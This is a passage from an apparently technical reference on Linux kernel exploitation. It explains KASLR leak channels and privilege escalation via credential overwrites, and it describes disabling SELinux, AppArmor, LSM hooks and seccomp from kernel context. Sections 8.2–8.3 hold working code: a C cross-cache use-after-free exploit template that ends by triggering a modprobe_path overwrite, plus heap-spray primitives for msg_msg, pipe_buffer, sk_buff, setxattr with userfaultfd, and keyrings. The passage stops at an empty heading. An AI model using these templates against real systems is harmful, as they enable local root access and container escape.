Without KPTI, Meltdown allows reading arbitrary kernel memory from user space at rates of up to several KB/s. The attack speculatively accesses kernel memory (e.g., by reading from a kernel virtual address in user mode), catches the resulting page fault, and uses a cache side-channel to extract the speculatively-read data. KPTI prevents this by removing the kernel page-table entries from the user page table, so the speculative access fails at the page-table walk stage (no valid PTE → no speculative data load → no side-channel).

On CPUs with hardware Meltdown fixes (Intel from Coffee Lake Refresh, all AMD CPUs which were never vulnerable to Meltdown, ARM cores with specific fixes), KPTI is not strictly necessary for Meltdown mitigation but is still deployed for defense-in-depth and for mitigating other side-channel attacks that require kernel page-table entries in user space.

---

## 5. Kernel Address Display Restriction and kptr_restrict bypass

### 5.1 kptr_restrict mechanism

The `kptr_restrict` sysctl (`/proc/sys/kernel/kptr_restrict`) controls how kernel pointers are printed in `/proc` and kernel log output via the `%pK` format specifier:

Value 0: kernel pointers are printed in cleartext for all users. This effectively disables KASLR for local users (anyone can read `/proc/kallsyms` and know every kernel symbol address).

Value 1: kernel pointers are printed as zeros unless the reader has `CAP_SYSLOG` and the process is not in a namespace that restricts capabilities. Root can still see kernel pointers; unprivileged users see `0000000000000000`.

Value 2: kernel pointers are always printed as zeros, regardless of privileges. Even root cannot see kernel pointers via `%pK`. This is the hardened setting used by some security-focused distributions.

### 5.2 Per-subsystem leaks

`kptr_restrict` only affects output using the `%pK` format specifier. Kernel code that uses `%p` (the standard pointer format) or `%px` (explicit "print as hex") bypasses `kptr_restrict` entirely. While the kernel community has been systematically converting `%p` to `%pK` in sensitive output paths, this is an ongoing process and lapses occur — new kernel features or driver code may inadvertently use `%p` for kernel pointers.

Additionally, some kernel interfaces expose address information through non-`printk` channels:

`/sys/kernel/debug/` (debugfs): when mounted (requires `CAP_SYS_RAWIO` or root on most distributions), debugfs entries often contain kernel pointers in raw format, bypassing `kptr_restrict`.

Netlink sockets: certain netlink message types include kernel addresses in their payloads. `NETLINK_KOBJECT_UEVENT` messages may contain device addresses; `NETLINK_ROUTE` messages may include internal table pointers in some configurations.

`/sys/kernel/slab/` (sysfs SLUB debug): when `CONFIG_SLUB_DEBUG` is enabled and the sysfs entries are readable, slab cache statistics can reveal heap layout information that aids in KASLR bypass for the heap region.

`perf_event_open`: performance counter events can leak kernel addresses through sample records (particularly the IP field in sampled events). The kernel restricts this based on `perf_event_paranoid` sysctl, but misconfigurations are common.

### 5.3 Format specifier evolution

The kernel has progressively hardened pointer printing:

`%p` (pre-4.15): printed the raw pointer value. Since 4.15, `%p` hashes the pointer value using a per-boot random key (based on `siphash`), printing a non-reversible hash. This prevents accidental pointer leaks while preserving the ability to compare pointers (two occurrences of the same pointer produce the same hash). The hash is not reversible — an attacker cannot recover the original pointer from the hash.

`%pK`: prints zero or the real address depending on `kptr_restrict`.

`%px`: prints the raw address unconditionally (intended for debugging only; grep for `%px` in production kernel code to find potential leak vectors).

`%pS` / `%ps`: prints the symbol name for a kernel address (e.g., `commit_creds+0x0/0x40`), which reveals both the function name and the offset from the function start, defeating KASLR if the base address can be computed from the function's known offset within the kernel image.

---

## 6. MAC bypass from kernel context

### 6.1 The canonical privilege-escalation primitive

The overwhelming majority of Linux kernel privilege-escalation exploits use the same technique: call `commit_creds(prepare_kernel_cred(NULL))` from kernel context. This two-function sequence:

`prepare_kernel_cred(NULL)`: allocates a new `struct cred` with root privileges (UID/GID 0, all capabilities, no security labels). The `NULL` argument tells the function to create a credential modeled after `init_cred` (the initial kernel credential, which has full privileges). The function allocates a new `struct cred` from the `cred_jar` slab cache, copies `init_cred`'s values, and returns a pointer to the new credential.

`commit_creds(new_cred)`: replaces the current task's active credentials (`current->cred` and `current->real_cred`) with the new credential. After this call, the current process has root privileges, all capabilities, and no MAC restrictions.

This primitive requires kernel code execution (the ability to call these two functions with controlled arguments). In a ROP-based exploit, the chain sets `rdi = 0`, calls `prepare_kernel_cred`, captures the return value (in `rax`), moves it to `rdi`, and calls `commit_creds`. After the chain returns to user space, the process has root privileges.

### 6.2 Direct credential structure manipulation

An alternative to calling `commit_creds(prepare_kernel_cred(0))` is to directly modify the current task's `struct cred` in memory using an arbitrary write primitive. The `struct cred` (defined in `include/linux/cred.h`) contains:

```c
struct cred {
    atomic_t usage;
    kuid_t uid, gid, suid, sgid, euid, egid, fsuid, fsgid;
    unsigned securebits;
    kernel_cap_t cap_inheritable, cap_permitted, cap_effective, cap_bset, cap_ambient;
    /* ... security labels, user namespace, ... */
};
```

The attacker locates `current->cred` (the pointer to the current task's credential structure, accessible via `current_cred()` which reads from the per-CPU `current_task` pointer), then overwrites the UID/GID fields to 0 and the capability fields to all-ones. This achieves the same effect as `commit_creds(prepare_kernel_cred(0))` but through data modification rather than function calls — making it a data-only attack that bypasses kernel CFI (Domain 4B §2.5, §11.3).

Locating `current->cred`: the `current` macro on x86_64 reads from the per-CPU variable `current_task` (accessed via the GS segment base). The `struct task_struct` is large (~6–10 KB depending on configuration), and the `cred` pointer is at a known offset within it. After KASLR defeat, the attacker can compute the address of `current_task`, dereference it to find the `task_struct`, add the known offset to reach the `cred` pointer, and dereference that to find the `struct cred`. Each dereference requires a kernel read primitive or prior knowledge of the target addresses.

### 6.3 SELinux enforcement bypass

SELinux enforcement is controlled by the global variable `selinux_enforcing` (in security/selinux/hooks.c). When this variable is 1, SELinux policies are enforced; when 0, SELinux is permissive (logs violations but allows them). An attacker with a kernel write primitive can overwrite `selinux_enforcing` to 0, disabling SELinux enforcement for the entire system.

The address of `selinux_enforcing` is in the kernel's `.data` section at a fixed offset from the kernel text base. After KASLR defeat, the attacker computes its address and writes 0 to it. This is a single 4-byte kernel write — one of the simplest possible kernel exploits once the prerequisites (KASLR defeat + arbitrary write) are satisfied.

Modern hardened configurations move `selinux_enforcing` to read-only memory after initialization (`__ro_after_init` annotation), preventing modification through simple memory writes. The attacker would need to modify the page-table permissions (marking the page writable) before modifying the variable, adding complexity.

### 6.4 AppArmor profile bypass

AppArmor's per-task profile is referenced through `current->cred->security`, which points to an AppArmor-specific security blob. The security blob contains a pointer to the current AppArmor profile (`aa_profile`). An attacker with a kernel write primitive can modify this pointer to reference the `unconfined` profile (which has no restrictions), bypassing AppArmor for the current process.

Alternatively, the attacker can modify the profile's `mode` field to `APPARMOR_COMPLAIN` (log but don't enforce) or `APPARMOR_UNCONFINED`, achieving the same effect.

### 6.5 LSM hook table overwrite

The Linux Security Module (LSM) framework routes security decisions through a linked list of hook functions (`security_hook_heads`, defined in `security/security.c`). Each hook head contains a list of callback function pointers that are called in sequence when a security decision is needed (e.g., `security_file_open`, `security_task_kill`).

An attacker with a kernel write primitive can modify the hook list to remove or replace individual hooks. Removing a hook (by unlinking it from the list) disables the corresponding security check. Replacing a hook's function pointer with a no-op function (or a function that always returns 0, indicating "permitted") converts the security check into a rubber stamp.

This is a powerful attack because it affects all processes system-wide (the LSM hook list is global), and the modification can be targeted to specific hooks (e.g., only disabling the `security_bprm_check` hook, which gates program execution, while leaving other hooks intact to avoid detection).

Mitigation: `CONFIG_SECURITY_WRITABLE_HOOKS` is not a real config option — the hook heads are placed in `__ro_after_init` memory by default since Linux 4.17, making them immutable after boot. An attacker would need to first modify the page-table entry for the hook heads' page (clearing the read-only bit) before modifying the hooks, adding another step to the exploit chain.

---

## 7. Seccomp bypass from kernel context

### 7.1 Seccomp enforcement mechanism

Seccomp (Secure Computing) restricts the syscall interface for a process (Domain 2, Chapter 2B §3). The kernel checks seccomp filters on every syscall entry: it reads the `TIF_SECCOMP` flag from `current->thread_info.flags`, and if set, calls `__secure_computing` which evaluates the BPF filter attached to `current->seccomp.filter`.

### 7.2 TIF_SECCOMP flag clearing

An attacker with a kernel write primitive can clear the `TIF_SECCOMP` flag in the current task's `thread_info.flags`. The `thread_info` struct is embedded at the bottom of the kernel stack page (on architectures that use the stack-based `thread_info` layout) or referenced via the per-CPU `current_task` variable. The `flags` field is at a known offset within `thread_info`.

Clearing `TIF_SECCOMP` disables all seccomp checks for the current task — the syscall entry path skips the filter evaluation entirely. This is a single bit-clear operation (clearing bit `TIF_SECCOMP` in the flags word) and requires only a 4-byte or 8-byte kernel write at a known address.

On kernels using `CONFIG_THREAD_INFO_IN_TASK` (the default on x86_64 since 4.9), `thread_info` is embedded within `struct task_struct` rather than at the stack base, so the attacker locates it via `current` + offset rather than via the stack pointer.

### 7.3 Seccomp mode and filter pointer manipulation

An alternative to clearing `TIF_SECCOMP` is to modify `current->seccomp.mode` to `SECCOMP_MODE_DISABLED` (0) and/or set `current->seccomp.filter` to `NULL`. The `mode` field determines whether seccomp is active; the `filter` pointer references the BPF filter chain. Setting `mode = 0` disables seccomp; setting `filter = NULL` causes the filter evaluation to skip (the kernel checks for a non-NULL filter before evaluating).

Both modifications are data-only attacks that bypass any kernel CFI. The attacker needs to know the offset of the `seccomp` field within `struct task_struct` (which varies by kernel build but is deterministic for a given kernel version and configuration) and the address of the current `task_struct` (obtainable after KASLR defeat via the `current` per-CPU variable).

### 7.4 Implications for container security

Seccomp is a critical container security boundary: Docker, Podman, and Kubernetes use seccomp profiles to restrict the syscall surface available to containerized processes. If an attacker achieves a kernel exploit from within a container, clearing `TIF_SECCOMP` or modifying the seccomp filter pointer removes this restriction, allowing the attacker to use any syscall (including `mount`, `unshare`, `ptrace`, etc.) to escape the container.

The defense against kernel-based seccomp bypass is preventing the kernel exploit in the first place — hardening the kernel's attack surface (disabling unprivileged BPF, restricting unprivileged user namespaces, minimizing kernel modules) and deploying kernel memory safety mechanisms (KASAN, MTE, hardware shadow stacks).

### 7.5 Seccomp-notify fd hijacking

Seccomp user notification (`SECCOMP_RET_USER_NOTIF`, introduced in Linux 5.0) allows a supervisor process to intercept syscalls from a sandboxed process and decide whether to allow or deny them. The supervisor receives a notification file descriptor and responds with allow/deny decisions. This mechanism is used by container runtimes (notably containerd with the seccomp agent) to implement policy decisions in user space.

An attacker who gains kernel write can hijack the seccomp-notify mechanism by modifying the `seccomp_filter` structure's notification pointer. The `struct seccomp_filter` contains a `notif` field pointing to a `struct seccomp_filter_notification` when a notification listener is attached. The attacker can modify this pointer to redirect notifications to an attacker-controlled handler or simply nullify it (causing the kernel to fall through to the filter's default action, which may be `SECCOMP_RET_ALLOW` for notification-only filters).

More subtly, the attacker can exploit a TOCTOU race in the seccomp-notify protocol itself: the supervisor checks the sandboxed process's state (via `/proc/[pid]/mem` or `/proc/[pid]/fd/`) after receiving the notification, but the sandboxed process can modify its memory between the check and the supervisor's response. While this is a design consideration rather than a kernel vulnerability (addressed by `SECCOMP_IOCTL_NOTIF_ADDFD` in Linux 5.9), misimplementations in the supervisor can create escape vectors. The kernel documentation (`samples/seccomp/user-trap.c`) explicitly warns about this TOCTOU window.

---

## 8. Combined exploit primitive chains

### 8.1 The canonical exploitation pipeline

A modern Linux kernel privilege-escalation exploit follows a structured pipeline:

**Stage 1: Vulnerability trigger.** The attacker triggers a kernel vulnerability (use-after-free, heap overflow, type confusion, race condition) that provides an initial corruption or information-leak primitive. Common triggering mechanisms include `ioctl` calls to vulnerable drivers, `setsockopt`/`getsockopt` on specific socket types, filesystem operations on crafted data, and netlink message processing.

**Stage 2: Information leak (KASLR defeat).** The attacker uses the vulnerability (or a separate bug) to leak a kernel code or data pointer. This reveals the KASLR base, enabling the attacker to compute the addresses of kernel functions and data structures. Alternatively, the attacker uses a side-channel (EntryBleed, prefetch timing) to defeat KASLR without a memory leak.

**Stage 3: Heap manipulation (for UAF/overflow exploits).** The attacker manipulates the kernel heap to control the contents of the freed or overflowed object. This typically involves cross-cache attacks or elastic-object exploitation (§8.2, §8.3) to place attacker-controlled data in the target slab cache's freed slot.

**Stage 4: Arbitrary write or code execution.** The attacker leverages the controlled heap data to achieve either an arbitrary kernel write (writing a controlled value to a controlled kernel address) or kernel code execution (hijacking a function pointer to execute a ROP chain). The former enables data-only attacks (§6.2, §6.3, §7.2); the latter enables ROP-based `commit_creds(prepare_kernel_cred(0))`.

**Stage 5: Privilege escalation.** The attacker applies the write or code-execution primitive to escalate privileges: modifying `current->cred`, calling `commit_creds`, overwriting `modprobe_path`, clearing `TIF_SECCOMP`, or disabling SELinux.

**Stage 6: Return to user space.** The attacker returns to user space with elevated privileges, ensuring the kernel is left in a stable state (avoiding a subsequent kernel panic). For ROP-based exploits, this involves executing `swapgs; iretq` or using the KPTI return trampoline. For data-only attacks, the attacker simply returns from the syscall that triggered the vulnerability.

### 8.2 Cross-cache attacks for SLUB freelist isolation bypass

SLUB (the default Linux kernel slab allocator) isolates allocations by type: each slab cache (e.g., `cred_jar`, `kmalloc-256`, `filp`) has its own set of memory pages, and objects from different caches are not interleaved. This isolation prevents a use-after-free in one cache from being replaced by an allocation from a different cache — a critical defense against type-confusion-based exploitation.

Cross-cache attacks bypass this isolation by exploiting the page allocator level beneath SLUB. When a slab cache's page is completely emptied (all objects on the page are freed), SLUB returns the page to the page allocator's buddy system. The page can then be reallocated to a different slab cache. The attack sequence:

1. The attacker allocates many objects in the target slab cache, filling multiple pages.
2. The attacker frees all objects on one specific page (using knowledge of the SLUB page layout to target a single page). This causes SLUB to return the page to the buddy allocator.
3. The attacker allocates objects in a different slab cache (the "replacement" cache, chosen for its exploitability). The buddy allocator may assign the same physical page to the new cache.
4. The attacker's use-after-free pointer (from the original cache) now points to an object from the replacement cache. The attacker can read or write the replacement object through the dangling pointer, achieving cross-type confusion.

This technique requires precise heap feng shui (controlling allocation and deallocation order) and often requires many attempts (the page assignment is probabilistic). Research by Google Project Zero (Jann Horn's "Exploiting the Linux kernel via packet sockets" and subsequent work) formalized cross-cache techniques.

#### 8.2.1 Cross-cache attack automation

The following Python script parses `/proc/slabinfo` to identify cache parameters needed for cross-cache exploitation, and the C template below demonstrates the full UAF → cross-cache → arbitrary read/write pipeline.

**Slab cache identification (Python):**

```python
#!/usr/bin/env python3
"""Parse /proc/slabinfo to identify kmalloc cache parameters
for cross-cache attack planning."""

import re
import sys
from dataclasses import dataclass

@dataclass
class SlabCache:
    name: str
    active_objs: int
    num_objs: int
    obj_size: int
    objs_per_slab: int
    pages_per_slab: int
    active_slabs: int
    num_slabs: int

    @property
    def slab_size_bytes(self) -> int:
        return self.pages_per_slab * 4096

    @property
    def free_objs(self) -> int:
        return self.num_objs - self.active_objs

    @property
    def utilization(self) -> float:
        return self.active_objs / max(self.num_objs, 1)

def parse_slabinfo(path: str = "/proc/slabinfo") -> list[SlabCache]:
    caches = []
    with open(path) as f:
        next(f)  # skip version line
        next(f)  # skip header
        for line in f:
            parts = line.split()
            if len(parts) < 8:
                continue
            caches.append(SlabCache(
                name=parts[0],
                active_objs=int(parts[1]),
                num_objs=int(parts[2]),
                obj_size=int(parts[3]),
                objs_per_slab=int(parts[4]),
                pages_per_slab=int(parts[5]),
                active_slabs=int(parts[13]) if len(parts) > 13 else 0,
                num_slabs=int(parts[14]) if len(parts) > 14 else 0,
            ))
    return caches

def find_target_caches(target_size: int, caches: list[SlabCache]) -> list[SlabCache]:
    """Find kmalloc caches that can receive an object of target_size."""
    return sorted(
        [c for c in caches if c.obj_size >= target_size and "kmalloc" in c.name],
        key=lambda c: c.obj_size
    )

def spray_plan(vuln_cache: str, replacement_cache: str, caches: list[SlabCache]):
    """Calculate spray parameters for cross-cache reclaim."""
    vc = next((c for c in caches if c.name == vuln_cache), None)
    rc = next((c for c in caches if c.name == replacement_cache), None)
    if not vc or not rc:
        print(f"Cache not found: {vuln_cache if not vc else replacement_cache}")
        return

    # To drain a slab page: allocate objs_per_slab objects, then free all
    # To reclaim: allocate objs_per_slab objects from replacement cache
    print(f"Vulnerable cache: {vc.name} (obj_size={vc.obj_size}, "
          f"objs/slab={vc.objs_per_slab}, pages/slab={vc.pages_per_slab})")
    print(f"Replacement cache: {rc.name} (obj_size={rc.obj_size}, "
          f"objs/slab={rc.objs_per_slab}, pages/slab={rc.pages_per_slab})")
    print(f"Drain count: allocate {vc.objs_per_slab * 4} objects to fill ~4 slabs")
    print(f"Free target: free all {vc.objs_per_slab} objects on one slab page")
    print(f"Reclaim spray: allocate {rc.objs_per_slab * 8} replacement objects")
    print(f"Free objects available: {vc.free_objs} (current headroom)")

if __name__ == "__main__":
    caches = parse_slabinfo()
    vuln_obj_size = int(sys.argv[1]) if len(sys.argv) > 1 else 256
    targets = find_target_caches(vuln_obj_size, caches)
    for c in targets[:5]:
        print(f"  {c.name}: obj_size={c.obj_size}, objs/slab={c.objs_per_slab}, "
              f"free={c.free_objs}, util={c.utilization:.1%}")
    if targets:
        spray_plan(targets[0].name, "kmalloc-256", caches)
```

**Complete cross-cache exploit template (C) — UAF → cross-cache → arbitrary read/write:**

```c
/* Cross-cache exploitation template.
 * Pattern: trigger UAF in victim cache → drain victim slab page →
 * reclaim page into msg_msg cache → use dangling pointer to read/write
 * across msg_msg headers for arbitrary kernel read/write.
 *
 * This is a structural template; the vulnerability trigger (step 1)
 * must be replaced with the actual CVE-specific trigger code. */

#define _GNU_SOURCE
#include <sys/msg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

/* Parameters (adjust per target kernel / vulnerability) */
#define VICTIM_OBJ_SIZE    256   /* size of vulnerable object */
#define OBJS_PER_SLAB      16    /* from slabinfo for victim cache */
#define SPRAY_COUNT        (OBJS_PER_SLAB * 8)
#define MSG_BODY_SIZE      (VICTIM_OBJ_SIZE - 48)  /* 48 = sizeof(struct msg_msg) */
#define LEAK_MSG_TYPE      0x41
#define WRITE_MSG_TYPE     0x42

/* Forward declarations for vulnerability-specific functions */
extern int  trigger_alloc(void);        /* allocate vulnerable object */
extern void trigger_free(int handle);   /* free the vulnerable object (UAF) */
extern int  trigger_use(int handle, void *buf, size_t len); /* use-after-free access */

int main(void)
{
    int qids[SPRAY_COUNT];
    int victim_handle;

    /* Phase 1: Heap grooming — fill victim slab cache */
    printf("[*] Phase 1: grooming heap, allocating %d victim objects\n", OBJS_PER_SLAB * 4);
    int groom_handles[OBJS_PER_SLAB * 4];
    for (int i = 0; i < OBJS_PER_SLAB * 4; i++)
        groom_handles[i] = trigger_alloc();

    /* Phase 2: Allocate target object (will be on a partially-filled slab) */
    victim_handle = trigger_alloc();
    printf("[*] Phase 2: target object allocated (handle=%d)\n", victim_handle);

    /* Phase 3: Free surrounding objects to empty the target slab page.
     * We free the grooming objects that share the same slab page.
     * In practice, this requires knowing or guessing the slab layout. */
    printf("[*] Phase 3: draining victim slab page\n");
    for (int i = 0; i < OBJS_PER_SLAB * 4; i++)
        trigger_free(groom_handles[i]);

    /* Phase 4: Trigger the UAF — free the target object */
    printf("[*] Phase 4: triggering UAF on target object\n");
    trigger_free(victim_handle);
    /* victim_handle is now a dangling reference */

    /* Phase 5: Reclaim with msg_msg spray.
     * The freed slab page is returned to the page allocator.
     * msg_msg allocations reclaim the page into the msg_msg cache. */
    printf("[*] Phase 5: spraying %d msg_msg objects (size=%d)\n",
           SPRAY_COUNT, VICTIM_OBJ_SIZE);
    for (int i = 0; i < SPRAY_COUNT; i++) {
        qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        struct { long mtype; char mtext[MSG_BODY_SIZE]; } msg;
        msg.mtype = LEAK_MSG_TYPE;
        memset(msg.mtext, 'C', MSG_BODY_SIZE);
        /* Embed a marker to identify which msg_msg overlaps the victim */
        *(unsigned long *)msg.mtext = 0xdeadbeef00000000UL | i;
        msgsnd(qids[i], &msg, MSG_BODY_SIZE, 0);
    }

    /* Phase 6: Use the dangling pointer to read the overlapping msg_msg.
     * The UAF read returns the msg_msg header, which contains:
     *   - m_list.next/prev (kernel heap pointers → info leak)
     *   - m_type (our marker)
     *   - m_ts (message text size — corruptible for OOB read) */
    printf("[*] Phase 6: reading via dangling pointer (info leak)\n");
    char leak_buf[VICTIM_OBJ_SIZE];
    trigger_use(victim_handle, leak_buf, VICTIM_OBJ_SIZE);

    unsigned long *leaked = (unsigned long *)leak_buf;
    printf("[+] Leaked kernel pointers: next=%#lx prev=%#lx\n", leaked[0], leaked[1]);
    unsigned long kbase = (leaked[0] & ~0xfffffUL) - 0x1000000UL; /* rough estimate */
    printf("[+] Estimated kernel base: %#lx\n", kbase);

    /* Phase 7: Corrupt msg_msg.m_ts for OOB read/write.
     * Overwrite m_ts to a large value → subsequent msgrcv reads beyond
     * the msg_msg allocation, leaking adjacent slab objects. */
    printf("[*] Phase 7: corrupting m_ts for OOB primitive\n");
    /* ... vulnerability-specific write via dangling pointer ... */

    /* Phase 8: Use OOB read to locate modprobe_path, then OOB write
     * to overwrite it. */
    printf("[*] Phase 8: overwriting modprobe_path\n");
    /* ... overwrite modprobe_path via corrupted msg_msg ... */

    /* Phase 9: Trigger modprobe_path execution */
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy && chmod +x /tmp/dummy && /tmp/dummy");

    /* Cleanup */
    for (int i = 0; i < SPRAY_COUNT; i++)
        msgctl(qids[i], IPC_RMID, NULL);

    return 0;
}
```

**Page-level heap feng shui.** Cross-cache attacks at the page level (as demonstrated by CVE-2024-1086, section 8.7) require a more granular approach. The attacker must ensure that a specific physical page is freed from the buddy allocator and then reallocated for a specific purpose (e.g., as a PTE page). The technique uses order-0 page spraying: the attacker allocates a large number of single pages (via `mmap` + `mlock`, or via `shmget`/`shmat`), creating memory pressure that forces the buddy allocator to split higher-order blocks. The attacker then selectively frees pages (by `munmap`-ing specific regions) to create order-0 holes at predictable physical addresses. The kernel's page allocator then fills these holes with the next page allocation request — if the attacker can trigger a PTE page allocation (by creating new virtual mappings via `mmap`), the PTE page occupies the freed slot. The attacker's UAF pointer (from the original vulnerability) still references the same physical page, which is now a PTE page — giving the attacker direct control over page-table entries.

### 8.3 Elastic objects

Elastic objects are kernel objects whose size is variable (controlled by user input), allowing the attacker to choose an allocation size that places the object in a specific slab cache. This gives the attacker control over which slab cache their object lands in, enabling targeted cross-cache attacks and heap spray.

Key elastic objects used in exploitation:

**`struct msg_msg`** (System V message queues): the user sends a message via `msgsnd` with an arbitrary body size. The kernel allocates a `struct msg_msg` header (48 bytes) plus the message body, with the total allocation size controlled by the user. For messages larger than `PAGE_SIZE - sizeof(struct msg_msg)`, the kernel allocates a `struct msg_msgseg` continuation segment. The attacker can choose the message size to target any `kmalloc-*` slab cache from `kmalloc-64` up to `kmalloc-4k`. Reading the message back via `msgrcv` leaks the object's content, making `msg_msg` useful for both spray and information leak.

**`struct pipe_buffer`** (pipe file descriptors): when data is written to a pipe, the kernel allocates `struct pipe_buffer` arrays. The size of the buffer array depends on the pipe's `F_SETPIPE_SZ` setting. `pipe_buffer` objects are allocated in `kmalloc-1024` by default (16 pipe_buffer entries × 64 bytes each = 1024 bytes on x86_64). The `pipe_buffer` struct contains a `struct page *page` pointer and a `const struct pipe_buf_operations *ops` function pointer — the `ops` pointer is a function table that the kernel dereferences during pipe operations, making it an attractive target for function-pointer hijack.

**`struct sk_buff`** (network socket buffers): skb data allocation size is controlled by the packet size. The attacker can spray skbs of a chosen size by sending packets to a local socket. skb data regions are allocated from `kmalloc-*` caches, providing flexible size control.

**`struct seq_operations`** (sequential file operations): opened via `/proc/self/stat` or similar `seq_file`-backed proc entries, allocated in `kmalloc-32`. Contains four function pointers (`start`, `stop`, `next`, `show`) that the kernel calls during read operations. Controlling these pointers gives direct kernel code execution.

**`struct timerfd_ctx`** (timer file descriptors): allocated in `kmalloc-256`, contains function pointers for timer expiry callbacks. Created via `timerfd_create` and controlled via `timerfd_settime`.

#### 8.3.1 Elastic object spray code

The following C code demonstrates spray primitives for each major elastic object type. These are the building blocks of cross-cache exploitation chains.

**msg_msg spray with controlled size and arbitrary read via MSG_COPY:**

```c
#define _GNU_SOURCE
#include <sys/msg.h>
#include <string.h>
#include <stdio.h>

#define SPRAY_COUNT 256

struct spray_msg {
    long mtype;
    char mtext[0];  /* flexible: controls kmalloc size */
};

/* Spray msg_msg objects into a target kmalloc-N cache.
 * Total allocation = sizeof(struct msg_msg) + body_size.
 * struct msg_msg header is 48 bytes on x86_64.
 * For kmalloc-256: body_size = 256 - 48 = 208.
 * For kmalloc-1024: body_size = 1024 - 48 = 976. */
int msg_spray(int qid, size_t body_size, int count, long mtype, const char *fill)
{
    struct spray_msg *msg = malloc(sizeof(long) + body_size);
    msg->mtype = mtype;
    memset(msg->mtext, 0, body_size);
    if (fill)
        memcpy(msg->mtext, fill, body_size < strlen(fill) ? body_size : strlen(fill));

    for (int i = 0; i < count; i++) {
        if (msgsnd(qid, msg, body_size, 0) < 0) {
            perror("msgsnd");
            free(msg);
            return i;
        }
    }
    free(msg);
    return count;
}

/* Read back a msg_msg via MSG_COPY (non-destructive peek).
 * MSG_COPY reads by index without removing the message,
 * enabling information leak from corrupted msg_msg objects. */
ssize_t msg_peek(int qid, long mtype, char *out, size_t len)
{
    struct spray_msg *msg = malloc(sizeof(long) + len);
    msg->mtype = mtype;
    ssize_t ret = msgrcv(qid, msg, len, mtype, MSG_COPY | IPC_NOWAIT);
    if (ret > 0)
        memcpy(out, msg->mtext, ret);
    free(msg);
    return ret;
}
```

**pipe_buffer spray for ops pointer hijack:**

```c
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>

#define PIPE_SPRAY_COUNT 128

/* pipe_buffer is allocated from kmalloc-1024 by default
 * (16 entries x 64 bytes = 1024 on x86_64).
 * Each pipe_buffer contains:
 *   struct page *page;
 *   unsigned int offset, len;
 *   const struct pipe_buf_operations *ops;  // function pointer table
 *   unsigned int flags;
 *
 * Spray strategy: create pipes, write 1 byte to allocate pipe_buffer array.
 * pipe_buffer->ops points to anon_pipe_buf_ops (known kernel address).
 * After cross-cache reclaim, corrupted ops pointer → code execution. */
int pipe_spray(int fds[][2], int count)
{
    for (int i = 0; i < count; i++) {
        if (pipe(fds[i]) < 0) {
            perror("pipe");
            return i;
        }
        /* Write 1 byte to force pipe_buffer allocation */
        write(fds[i][1], "X", 1);
    }
    return count;
}

/* Free pipe_buffer by closing both ends */
void pipe_free(int fds[][2], int idx)
{
    close(fds[idx][0]);
    close(fds[idx][1]);
}

/* Trigger ops->release() on a specific pipe_buffer.
 * If ops has been corrupted via cross-cache overwrite,
 * this calls the attacker-controlled function pointer. */
void pipe_trigger_ops(int fds[][2], int idx)
{
    close(fds[idx][0]);  /* last reader close triggers pipe_release → ops->release() */
    close(fds[idx][1]);
}
```

**sk_buff spray with controlled data placement:**

```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>

#define SKB_SPRAY_COUNT 256

/* sk_buff data is allocated from kmalloc-N where N depends on packet size.
 * For a UDP payload of S bytes, the kernel allocates approximately
 * S + sizeof(struct sk_buff) + protocol headers (~300 bytes overhead).
 * Target kmalloc-512: send ~200 bytes of UDP payload.
 * Target kmalloc-1024: send ~700 bytes of UDP payload. */
int skb_spray(int count, size_t payload_size, const char *data)
{
    int socks[SKB_SPRAY_COUNT][2];
    char *payload = malloc(payload_size);
    memset(payload, 'B', payload_size);
    if (data)
        memcpy(payload, data, payload_size < strlen(data) ? payload_size : strlen(data));

    for (int i = 0; i < count && i < SKB_SPRAY_COUNT; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks[i]) < 0) {
            perror("socketpair");
            free(payload);
            return i;
        }
        send(socks[i][0], payload, payload_size, 0);
        /* sk_buff remains queued on socks[i][1] recv buffer */
    }
    free(payload);
    return count;
}
```

**setxattr + userfaultfd for temporal control (SMAP-era spray):**

```c
#include <sys/xattr.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <sys/mman.h>
#include <unistd.h>

/* setxattr allocates a kernel buffer (kvmalloc) of attacker-controlled
 * size, copies user data into it, then frees it. The allocation is
 * transient, but combined with userfaultfd stalling, the attacker
 * can freeze the kernel mid-copy with the buffer still allocated.
 *
 * Technique:
 * 1. mmap a region and register userfaultfd on it.
 * 2. Call setxattr with value pointing into the uffd-monitored region.
 * 3. Kernel allocates kvmalloc buffer, begins copy_from_user.
 * 4. copy_from_user faults on the uffd page → kernel thread blocks.
 * 5. The allocated buffer remains live in the target slab cache.
 * 6. Attacker performs other heap operations while buffer is pinned.
 * 7. Attacker releases the uffd fault → copy completes → buffer freed.
 */

/* Setup userfaultfd for page-fault stalling */
int setup_uffd(void *addr, size_t len)
{
    long uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd < 0) return -1;

    struct uffdio_api api = { .api = UFFD_API };
    ioctl(uffd, UFFDIO_API, &api);

    struct uffdio_register reg = {
        .range = { .start = (unsigned long)addr, .len = len },
        .mode = UFFDIO_REGISTER_MODE_MISSING,
    };
    ioctl(uffd, UFFDIO_REGISTER, &reg);
    return uffd;
}

/* Pin a kmalloc allocation via setxattr + uffd stall.
 * Returns when the uffd handler resolves the fault. */
void *setxattr_spray_thread(void *arg)
{
    /* value spans a uffd-monitored page boundary:
     * first part copies normally, second part faults → stall */
    char path[] = "/tmp/.xattr_target";
    int fd = open(path, O_CREAT | O_RDWR, 0644);
    close(fd);

    /* This call blocks when copy_from_user hits the uffd page */
    setxattr(path, "user.spray", arg, 256, 0);
    return NULL;
}

/* Simple keyring spray for cross-cache (kmalloc-192 on x86_64).
 * add_key allocates struct user_key_payload from kmalloc-N
 * where N includes the payload size. */
#include <keyutils.h>

int keyring_spray(int count, size_t payload_size, const char *data)
{
    key_serial_t keys[256];
    char desc[32];

    for (int i = 0; i < count && i < 256; i++) {
        snprintf(desc, sizeof(desc), "spray_%d", i);
        keys[i] = add_key("user", desc, data, payload_size,
                           KEY_SPEC_SESSION_KEYRING);
        if (keys[i] < 0) return i;
    }
    return count;
}
```

### 8.4 modprobe_path and core_pattern overwrite

